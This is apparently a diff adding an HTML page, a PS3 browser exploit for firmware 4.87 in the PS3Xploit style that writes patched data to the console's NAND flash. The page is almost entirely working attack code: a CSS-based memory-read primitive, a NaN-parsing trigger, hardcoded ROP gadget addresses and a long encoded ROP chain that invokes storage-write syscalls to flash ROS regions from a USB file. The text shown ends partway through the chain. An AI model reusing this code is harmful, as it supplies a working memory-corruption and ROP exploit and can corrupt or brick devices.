@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html>
+<script>
+var debug=false;
+var br="<br>";
+var hr="<hr>";
+var t_out=0;
+var total_loops=0;
+var max_loops=20;
+var sp_exit=0x8FD8DCC0;
+var toc_addr=0;
+var gadget1_addr=0;
+var gadget2_addr=0;
+var gadget3_addr=0;
+var gadget4_addr=0;
+var gadget5_addr=0;
+var gadget6_addr=0;
+var gadget7_addr=0;
+var gadget8_addr=0;
+var usb_fp,stack_frame,jump_2,jump_1;
+var usb_fp_addr,stack_frame_addr,jump_2_addr,jump_1_addr;
+var used_port=0;
+var n, y, m, d;
+function asciiAt(str, i){
+	return str.charCodeAt(i)&0xFF;
+}
+function str2ascii(str){
+	var ascii = "";
+	var i = 0;
+	for (; i < str.length; i++){ascii += str.charCodeAt(i).toString(16);}
+	return ascii;
+}
+function hexh2bin(hex_val)
+{
+return String.fromCharCode(hex_val);
+
+}
+function hexw2bin(hex_val)
+{
+	return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val);
+}
+function s2hex(str){
+	var hex = [];
+	var  i = 0;
+    for (;i < str.length; i++) {
+		hex.push(hex16(str.charCodeAt(i).toString(16)));
+    }
+	return hex.join("");
+}
+function hex32(s){
+	return ('00000000' + s).substr(-8);
+}
+function hex16(s){
+	return ('0000' + s).substr(-4)
+}
+function hex8(s){
+	return ('00' + s).substr(-2);
+}
+function convertString(str) {
+	var asciistr = str2ascii(str);
+	if((asciistr.length%4)!=0)asciistr+='00';
+	var asciichr;
+    var ret = [];
+    var i;
+    var len;
+    for(i = 0, len = asciistr.length; i < len; i += 4) {
+	   asciichr = asciistr.substr(i, 4);
+       ret.push(String.fromCharCode(parseInt(asciichr, 16)));
+    }
+    return ret.join('');
+}
+function sleep(milliseconds){
+  var start = new Date().getTime();
+  for (var i = 0; i < 1e7; i++) {
+    if ((new Date().getTime() - start) > milliseconds){
+      break;
+    }
+  }
+}
+function logAdd(txt){
+	if(debug===true)
+	{
+		if(document.getElementById("log").innerHTML==="")document.getElementById("log").innerHTML=hr;
+		document.getElementById("log").innerHTML += txt + br;
+	}
+	
+}
+function clearLogEntry(){
+	document.getElementById("log").innerHTML = "";
+}
+function writeEnvInfo(){
+	document.getElementById('footer').innerHTML=hr+"<h3>PS3 System Browser Info:</h3>"+navigator.userAgent+br+navigator.appName+" (" + navigator.platform + ")"+br+new Date().toTimeString() + br;
+}
+function setCharAt(str,index,chr){
+	if(index > str.length-1) return str;
+	return str.substr(0,index) + chr + str.substr(index+1);
+}
+String.prototype.replaceAt=function(index, ch){
+	return this.substr(0, index) + ch + this.substr(index+ch.length);
+}
+
+//#########################################################################################################################################################################
+
+Number.prototype.noExponents=function()
+{
+    var data= String(this).split(/[eE]/);
+    if(data.length== 1) return data[0]; 
+    var  z= '', sign= this<0? '-':'',
+    str= data[0].replace('.', ''),
+    mag= Number(data[1])+ 1;
+    if(mag<0){
+        z= sign + '0.';
+        while(mag++) z += '0';
+        return z + str.replace(/^\-/,'');
+    }
+    mag -= str.length;  
+    while(mag--) z += '0';
+    return str + z;
+}
+function fromIEEE754(bytes, ebits, fbits)
+{
+	var retNumber = 0;
+	var bits = [];
+	for (var i = bytes.length; i; i -= 1)
+	{
+		var byte = bytes[i - 1];
+		for (var j = 8; j; j -= 1)
+		{
+			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
+		}
+	}
+	bits.reverse();
+	var str = bits.join('');
+	var bias = (1 << (ebits - 1)) - 1;
+	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
+	var e = parseInt(str.substring(1, 1 + ebits), 2);
+	var f = parseInt(str.substring(1 + ebits), 2);
+	if (e === (1 << ebits) - 1)
+	{
+		retNumber = f !== 0 ? NaN : s * Infinity;
+	}
+	else if (e > 0)
+	{
+		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
+	}
+	else if (f !== 0)
+	{
+		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
+	}
+	else
+	{
+		retNumber = s * 0;
+	}
+	return retNumber.noExponents();
+}
+function generateIEEE754(address, size)
+{
+	var hex = new Array
+	(
+		(address >> 24) & 0xFF,
+		(address >> 16) & 0xFF,
+		(address >> 8) & 0xFF,
+		(address) & 0xFF,
+		
+		(size >> 24) & 0xFF,
+		(size >> 16) & 0xFF,
+		(size >> 8) & 0xFF,
+		(size) & 0xFF
+	);
+	return fromIEEE754(hex, 11, 52);
+}
+function generateExploit(address, size)
+{
+	var n = (address<<32) | ((size>>1)-1);
+	return generateIEEE754(address, (n-address));
+}
+
+function readMemory(address, size)
+{
+	document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";
+}
+function checkMemory(address, size, len)
+{
+	readMemory(address, size);
+	if(debug===true)
+	{
+		var x=document.getElementById('exploit').style.src.substr(6,len);
+		logAdd("checkMemory: "+s2hex(x));
+		return x;
+	}
+	return document.getElementById('exploit').style.src.substr(6,len);
+}
+
+function trigger(exploit_addr){
+	document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
+}
+
+//####################################################################################################################################################################
+function success(str)
+{
+	// operations to execute on ROP exit
+	showResult(str);
+}
+function enable_trigger()
+{
+	if(document.getElementById('btnTrigger'))document.getElementById('btnTrigger').disabled=false;
+	if(document.getElementById('btnReset'))document.getElementById('btnReset').disabled=false;
+}
+
+function resetOptions(cleanResult)
+{
+
+	if(document.getElementById('usb0'))document.getElementById('usb0').checked=true;
+	if(document.getElementById('usb1'))document.getElementById('usb1').checked=false;
+	if(document.getElementById('usb6'))document.getElementById('usb6').checked=false;
+	if(document.getElementById('sd'))document.getElementById('sd').checked=false;
+	if(document.getElementById('cf'))document.getElementById('cf').checked=false;
+	if(document.getElementById('ms'))document.getElementById('ms').checked=false;
+	if(cleanResult==true)document.getElementById('result').innerHTML="";
+	cleanGUI();
+	used_port=0;
+}
+function cleanGUI()
+{
+	enable_cb();
+	enable_btn();
+	if(document.getElementById('btnTrigger'))document.getElementById('btnTrigger').disabled=true;
+	if(document.getElementById('step2'))document.getElementById('step2').innerHTML="<h3><b>Wait for the exploit initialization to succeed...</b></h3>";
+	document.getElementById('log').innerHTML="";
+	t_out=0;
+	total_loops=0;
+}
+function disable_cb()
+{
+	if(document.getElementById('usb0'))document.getElementById('usb0').disabled=true;
+	if(document.getElementById('usb1'))document.getElementById('usb1').disabled=true;
+	if(document.getElementById('usb6'))document.getElementById('usb6').disabled=true;
+	if(document.getElementById('sd'))document.getElementById('sd').disabled=true;
+	if(document.getElementById('cf'))document.getElementById('cf').disabled=true;
+	if(document.getElementById('ms'))document.getElementById('ms').disabled=true;
+}
+function enable_cb()
+{
+	if(document.getElementById('usb0'))document.getElementById('usb0').disabled=false;
+	if(document.getElementById('usb1'))document.getElementById('usb1').disabled=false;
+	if(document.getElementById('usb6'))document.getElementById('usb6').disabled=false;
+	if(document.getElementById('sd'))document.getElementById('sd').disabled=false;
+	if(document.getElementById('cf'))document.getElementById('cf').disabled=false;
+	if(document.getElementById('ms'))document.getElementById('ms').disabled=false;
+}
+function disable_btn()
+{
+	if(document.getElementById('btnROP'))document.getElementById('btnROP').disabled=true;
+	if(document.getElementById('btnReset'))document.getElementById('btnReset').disabled=true;
+	if(document.getElementById('btnTrigger'))document.getElementById('btnTrigger').disabled=true;
+}
+function enable_btn()
+{
+	if(document.getElementById('btnROP'))document.getElementById('btnROP').disabled=false;
+	if(document.getElementById('btnReset'))document.getElementById('btnReset').disabled=false;
+	if(document.getElementById('btnTrigger'))document.getElementById('btnTrigger').disabled=false;
+}
+function usb(port)
+{
+	var usb_0=null, usb_1=null, usb_6=null, sd_0=null, cf_0=null, ms_0=null;
+	if(document.getElementById('usb0'))usb_0=document.getElementById('usb0');
+	if(document.getElementById('usb1'))usb_1=document.getElementById('usb1');
+	if(document.getElementById('usb6'))usb_6=document.getElementById('usb6');
+	if(document.getElementById('sd'))sd_0=document.getElementById('sd');
+	if(document.getElementById('cf'))cf_0=document.getElementById('cf');
+	if(document.getElementById('ms'))ms_0=document.getElementById('ms');
+	if((usb_0!==null)&&(usb_1!==null)&&(usb_6!==null)&&(sd_0!==null)&&(cf_0!==null)&&(ms_0!==null))
+	{
+		if((sd_0.checked===false)&&(cf_0.checked===false)&&(ms_0.checked===false)&&(usb_0.checked===false)&&(usb_1.checked===false)&&(usb_6.checked===false)){usb_0.checked=true;port=0;}
+	}
+	else if((usb_0!==null)&&(usb_1!==null)&&(usb_6!==null))
+	{
+		if((usb_0.checked===false)&&(usb_1.checked===false)&&(usb_6.checked===false)){usb_0.checked=true;port=0;}
+	}
+	else 
+	{
+		logAdd("Malformed HTML checkbox options!");
+		return;
+	}
+	
+switch (port){
+
+case 1:
+		used_port=1;
+		usb_0.checked=false;
+		usb_6.checked=false;
+		if(sd_0!==null)sd_0.checked=false;
+		if(cf_0!==null)cf_0.checked=false;
+		if(ms_0!==null)ms_0.checked=false;
+		break;
+case 6:
+		used_port=6;
+		usb_0.checked=false;
+		usb_1.checked=false;
+		if(sd_0!==null)sd_0.checked=false;
+		if(cf_0!==null)cf_0.checked=false;
+		if(ms_0!==null)ms_0.checked=false;
+		break;
+		
+case 1000:
+		used_port=1000;
+		usb_0.checked=false;
+		usb_1.checked=false;
+		usb_6.checked=false;
+		if(cf_0!==null)cf_0.checked=false;
+		if(ms_0!==null)ms_0.checked=false;
+		break;
+case 1001:
+		used_port=1001;
+		usb_0.checked=false;
+		usb_1.checked=false;
+		usb_6.checked=false;
+		if(sd_0!==null)sd_0.checked=false;
+		if(ms_0!==null)ms_0.checked=false;
+		break;
+case 1002:
+		used_port=1002;
+		usb_0.checked=false;
+		usb_1.checked=false;
+		usb_6.checked=false;
+		if(sd_0!==null)sd_0.checked=false;
+		if(cf_0!==null)cf_0.checked=false;
+		break;
+default:
+		used_port=0;
+		usb_1.checked=false;
+		usb_6.checked=false;
+		if(sd_0!==null)sd_0.checked=false;
+		if(cf_0!==null)cf_0.checked=false;
+		if(ms_0!==null)ms_0.checked=false;
+		break;
+}
+}
+function showResult(str)
+{
+	document.getElementById('result').innerHTML=str;
+}
+function findJsVariableOffset(name,exploit_data,base,size)
+{
+	readMemory(base,size);
+	var dat=document.getElementById('exploit').style.src.substr(6,size);
+	for (var i=0;i<(dat.length*2);i+=0x10)	{
+		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
+		{
+			var match=0;
+			for (var k=0;k<(exploit_data.length*2);k+=0x2)
+			{
+				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2))break;
+				match+=1;
+			}
+			if (match===exploit_data.length)
+			{
+				var exploit_addr=base+i+4;
+				logAdd("Found "+name+" at: 0x"+exploit_addr.toString(16)+br+s2hex(exploit_data));
+				return exploit_addr;
+			}
+		}
+	}
+	var end_range=base+size;
+	logAdd("The string variable named "+name+" could not be located in range 0x"+base.toString(16)+" - 0x"+end_range.toString(16));
+	return 0;
+}
+
+//####################################################################################################################################################################
+function ps3chk(){
+	var fwCompat = ["4.87"];
+	var ua = navigator.userAgent;
+	var uaStringCheck = ua.substring(ua.indexOf("5.0 (") + 5, ua.indexOf(") Apple") - 7);
+	var fwVersion = ua.substring(ua.indexOf("5.0 (") + 19, ua.indexOf(") Apple"));
+	resetOptions();
+	switch (uaStringCheck) {
+		case "PLAYSTATION":
+			switch (fwVersion) {
+				case fwCompat[0]:
+					alert("ATTENTION!\n\nYour firmware version requires HFW (Hybrid Firmware) to be installed. OFW is not supported!\n\nThis page cannot distinguish between OFW and HFW.");
+					toc_addr=0x6F5558;
+					gadget1_addr=0x097604;
+					gadget2_addr=0x60EFD8; 
+					gadget3_addr=0x0D9684;
+					gadget4_addr=0x0DB054;
+					gadget5_addr=0x19D3AC;
+					gadget6_addr=0x42C778;
+					gadget7_addr=0x423854;
+					gadget8_addr=0x2BACB8;
+					break;
+					
+				default:
+					alert("Your PS3 is not on FW 4.87! Your current running FW version is " + fwVersion + ", which is not compatible with PS3Xploit Flasher. All features have been disabled");
+					disable_btn();
+					disable_cb();
+					break;
+			}
+			break;
+		default:
+			alert("You are not on a PlayStation System! All features have been disabled");
+			disable_btn();
+			disable_cb();
+			break;
+	}
+}
+</script>
+<head>
+<meta charset="UTF-8">
+<title>NAND CFW PATCH EDIT by JONI</title>
+<script>
+function initROP()
+{
+	try
+	{	
+		disable_cb();
+		disable_btn();
+		if(t_out!=0){clearTimeout(t_out);t_out=0;}
+		var sc_sso=0x258;
+		var sc_ssc=0x259;
+		var sc_ssw=0x25B;
+		var ros0_start_sector=0x401;
+		var ros1_start_sector=0x3C01;
+		var sec_step=0x800;
+		var sec_endstep=0x2;
+		var flash_id=0x22;
+		var flash_flag=0x01000000;
+		var flash2_flag=0x00000001; //NAND
+		var search_max_threshold = 70*0x100000;
+		var temp_addr= 0x8A000000;
+		var search_base = 0x80100000;
+		var search_size = 0x200000;
+		var rosdump_addr=0x8C000000;
+		var ros0flash_addr=0x8C000000;
+		var ros0flash_addr2=0x8C100000;
+		var ros0flash_addr3=0x8C200000;
+		var ros0flash_addr4=0x8C300000;
+		var ros1flash_addr=0x8C000010;
+		var ros1flash_addr2=0x8C100010;
+		var ros1flash_addr3=0x8C200010;
+		var ros1flash_addr4=0x8C300010;
+		var fread_mode="rb";
+		usb_fp_addr=0;
+		stack_frame_addr=0;
+		jump_2_addr=0;
+		jump_1_addr=0;
+		total_loops++;
+		clearLogEntry();
+		var fp_root;
+		var f_off_start=0x0;
+		if(used_port===1){fp_root=convertString("xxxx/dev_usb001/");}
+		else if(used_port===6){fp_root=convertString("xxxx/dev_usb006/");}
+		else if(used_port===1000){fp_root=convertString("xxxxxxxx/dev_sd/");f_off_start=0x4;}
+		else if(used_port===1001){fp_root=convertString("xxxxxxxx/dev_cf/");f_off_start=0x4;}
+		else if(used_port===1002){fp_root=convertString("xxxxxxxx/dev_ms/");f_off_start=0x4;}
+		else {used_port=0;fp_root=convertString("xxxx/dev_usb000/");}
+		
+		usb_fp=fp_root+convertString("flash_487.hex")+unescape("\u0000")+convertString(fread_mode)+unescape("\u0000\u0000\u4141\u4141\u4141\u4141")
+		+hexw2bin(gadget3_addr)+hexw2bin(toc_addr)+unescape("\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141")+hexw2bin(gadget7_addr)+hexw2bin(toc_addr)+unescape("\uFD7E");
+		function reload()
+		{
+			showResult(hr+"<h1><b>Exploit Initialization..."+br+"<font color=%22000000%22>Progress: "+((100/max_loops)*total_loops).toString()+"%, please wait...</font></b></h1>");
+			t_out=setTimeout(initROP,1000);
+		};
+		function fail()
+		{
+			total_loops=0;
+			showResult(hr+"<h1><b>Exploit Initialization FAILED!</h1><h2><font color=%22000000%22><a href=\"javascript:window.location.reload()\">Refresh this page</a> & try again...</font></b></h2>");
+			cleanGUI();
+			usb(used_port);
+		};
+		
+		do
+		{
+			if(search_max_threshold<search_size){
+			if(total_loops<max_loops)reload();
+			else fail();
+			return;}
+			usb_fp=usb_fp.replaceAt(0,hexh2bin(0x7EFD));
+			usb_fp_addr=findJsVariableOffset("usb_fp",usb_fp,search_base,search_size);
+			search_max_threshold-=search_size;
+		}while(usb_fp_addr===0);
+		
+		var rb_addr=usb_fp_addr+0x1C;
+		var readlen_io=usb_fp_addr+0x22;
+		var sc_addr=usb_fp_addr+0x2A;
+		var readlen_addr=usb_fp_addr+0x34;
+		var dev_handle_addr=usb_fp_addr+0x3C;
+		var fopen_addr=usb_fp_addr+0x44;
+		var usb_addr=usb_fp_addr+f_off_start;
+		
+		stack_frame= unescape("\u0102\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+unescape("\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u0000\u0000")+hexw2bin(toc_addr)+unescape("\u5152\u5354\u5556\u5758\u5960\u6162\u6364")
+					+unescape("\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(temp_addr)+unescape("\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192")
+					+unescape("\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556")
+					+unescape("\u5758\u5960\u6162")+hexw2bin(sc_sso)+unescape("\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0000")+hexw2bin(dev_handle_addr)+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(sc_addr)+unescape("\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\uFF29\uFF29\uFF29")
+					+unescape("\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(temp_addr+0x20)+unescape("\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u0000\u0000")+hexw2bin(gadget5_addr+0x4)+unescape("\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384")
+					+unescape("\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u8586\u8788")
+					+unescape("\u8990\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566")+hexw2bin(flash_flag)+hexw2bin(flash2_flag)+unescape("\u7576\u7778\u7980\u8182\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112")
+					+unescape("\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576")
+					+unescape("\u7778\u7980\u8182\uFF11\uFF11\uFF10\uFF10\u8033\u84F0\u8033\u853E\u0010\u0000")+hexw2bin(rosdump_addr)+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(fopen_addr)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29")
+					+unescape("\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget4_addr)+unescape("\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304")
+					+unescape("\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768")
+					+unescape("\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(temp_addr+0x40)+unescape("\u0000\u0000")+hexw2bin(usb_addr)+unescape("\u0000\u0000")+hexw2bin(rb_addr)+unescape("\u0000\u0000\u0505\u0505\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132")
+					+unescape("\u3334\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596")
+					+unescape("\u9798\u9900\u0102\u0304\u0506\u0000\u0259\u1112\u1314\u0000\u0000\u0030\u6000\u0000\u0000")+hexw2bin(readlen_io)+unescape("\u0000\u0000")+hexw2bin(rosdump_addr)+unescape("\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000")+hexw2bin(dev_handle_addr)
+					+unescape("\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(gadget5_addr)+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324")
+					+unescape("\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u0000\u0000")+hexw2bin(usb_addr)+unescape("\u0000\u0000")+hexw2bin(rb_addr)+unescape("\u7576\u7778\u7980\u8182\uFFFF\uFFFF\uFFFF")
+					+unescape("\uFFFF\u0000\u0000")+hexw2bin(usb_addr)+unescape("\u0000\u0000")+hexw2bin(rb_addr)+unescape("\u4344\u4546\u4748\u4950\u0000\u0000")+hexw2bin(temp_addr+0x60)+unescape("\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u0000\u0000\u0047\u5134\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA")
+					+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\uFF29\uFF29\u0000\u0000\uFF30\uFF30\u0000\u0000")+hexw2bin(temp_addr+0x80)+unescape("\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA")
+					+unescape("\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00")+hexw2bin(sc_ssw)+unescape("\uFF10\uFF10")+hexw2bin(temp_addr+0x200)+hexw2bin(ros0flash_addr)
+					+hexw2bin(sec_step)+hexw2bin(ros0_start_sector)+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(flash_id)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)
+					+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget6_addr)+unescape("\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(temp_addr+0x50000)
+					+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00")+hexw2bin(sc_ssw)+unescape("\uFF10\uFF10")+hexw2bin(temp_addr+0x300)+hexw2bin(ros0flash_addr2)
+					+hexw2bin(sec_step)+hexw2bin(ros0_start_sector+sec_step)+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(flash_id)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)
+					+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget6_addr)+unescape("\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(temp_addr+0x50100)
+					+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00")+hexw2bin(sc_ssw)+unescape("\uFF10\uFF10")+hexw2bin(temp_addr+0x400)+hexw2bin(ros0flash_addr3)
+					+hexw2bin(sec_step)+hexw2bin(ros0_start_sector+(2*sec_step))+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(flash_id)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)
+					+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget6_addr)+unescape("\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(temp_addr+0x50200)
+					+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00")+hexw2bin(sc_ssw)+unescape("\uFF10\uFF10")+hexw2bin(temp_addr+0x500)+hexw2bin(ros0flash_addr4)				
+					+hexw2bin(sec_endstep)+hexw2bin(ros0_start_sector+(3*sec_step))+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(flash_id)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)
+					+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget6_addr)+unescape("\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
+					+unescape("\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u0000\u0000")+hexw2bin(temp_addr+0x50300)
+					+unescape("\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0000\u0000")+hexw2bin(gadget2_addr)+unescape("\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728")
+					+unescape("\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\uFF00\uFF00")+hexw2bin(sc_ssw)+unescape("\uFF10\uFF10")+hexw2bin(temp_addr+0x600)+hexw2bin(ros1flash_addr)
+					+hexw2bin(sec_step)+hexw2bin(ros1_start_sector)+unescape("\u0000\u0000\uFF03\uFF03")+hexw2bin(flash_id)+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000")+hexw2bin(dev_handle_addr)
+					+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000")+hexw2bin(gadget6_addr)+unescape("\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920")
